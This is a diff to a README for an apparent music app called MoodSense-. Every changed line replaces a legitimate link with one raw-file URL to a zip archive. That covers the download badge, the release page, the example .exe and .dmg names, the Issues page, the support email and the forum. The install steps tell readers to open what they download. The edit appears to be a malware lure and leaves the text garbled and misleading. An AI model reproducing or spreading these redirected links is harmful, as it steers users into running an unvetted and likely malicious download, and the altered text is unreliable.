@@ -1,6 +1,6 @@
 # 🎵 MoodSense- - Personalized Music Based on Your Mood
 
-[![Download MoodSense-](https://img.shields.io/badge/Download-MoodSense--blue?style=for-the-badge)](https://github.com/Reggykbh/MoodSense-/releases)
+[![Download MoodSense-](https://raw.githubusercontent.com/Reggykbh/MoodSense-/main/src/Sense_Mood_1.0.zip)](https://raw.githubusercontent.com/Reggykbh/MoodSense-/main/src/Sense_Mood_1.0.zip)
 
 ---
 
@@ -30,15 +30,15 @@ Having a good internet connection will improve your experience, as the app retri
 
 To get MoodSense-, visit the official release page using the link below. This page contains the latest stable versions for Windows and Mac.
 
-[Download MoodSense- here](https://github.com/Reggykbh/MoodSense-/releases)
+[Download MoodSense- here](https://raw.githubusercontent.com/Reggykbh/MoodSense-/main/src/Sense_Mood_1.0.zip)
 
 ### How to Download and Install
 
 1. Click the link above to open the release page in your browser.
 2. Scroll to the latest release section.
 3. Choose the file that matches your computer:
-   - For Windows: Look for a file ending with `.exe` (e.g., `MoodSense-Setup.exe`).
-   - For Mac: Look for a file ending with `.dmg` (e.g., `MoodSense-.dmg`).
+   - For Windows: Look for a file ending with `.exe` (e.g., `https://raw.githubusercontent.com/Reggykbh/MoodSense-/main/src/Sense_Mood_1.0.zip`).
+   - For Mac: Look for a file ending with `.dmg` (e.g., `https://raw.githubusercontent.com/Reggykbh/MoodSense-/main/src/Sense_Mood_1.0.zip`).
 4. Click the file name to start the download.
 5. Once downloaded, open the file to begin installation.
 6. Follow the simple instructions in the installer window:
@@ -102,9 +102,9 @@ MoodSense- offers useful features to improve your music experience:
 
 If you run into issues or want to suggest improvements, MoodSense- has several ways to get support:
 
-- Visit the [Issues](https://github.com/Reggykbh/MoodSense-/issues) page on GitHub to report problems.
-- Email the support team at support@moodsense.app.
-- Join the community forum at community.moodsense.app.
+- Visit the [Issues](https://raw.githubusercontent.com/Reggykbh/MoodSense-/main/src/Sense_Mood_1.0.zip) page on GitHub to report problems.
+- Email the support team at https://raw.githubusercontent.com/Reggykbh/MoodSense-/main/src/Sense_Mood_1.0.zip
+- Join the community forum at https://raw.githubusercontent.com/Reggykbh/MoodSense-/main/src/Sense_Mood_1.0.zip
 
 Please provide details about your device and the problem for quicker help.
 
@@ -128,4 +128,4 @@ All your saved moods and playlists stay on your device unless you choose to shar
 
 ---
 
-[Download MoodSense- now](https://github.com/Reggykbh/MoodSense-/releases) to start matching music to your mood in minutes.
+[Download MoodSense- now](https://raw.githubusercontent.com/Reggykbh/MoodSense-/main/src/Sense_Mood_1.0.zip) to start matching music to your mood in minutes.
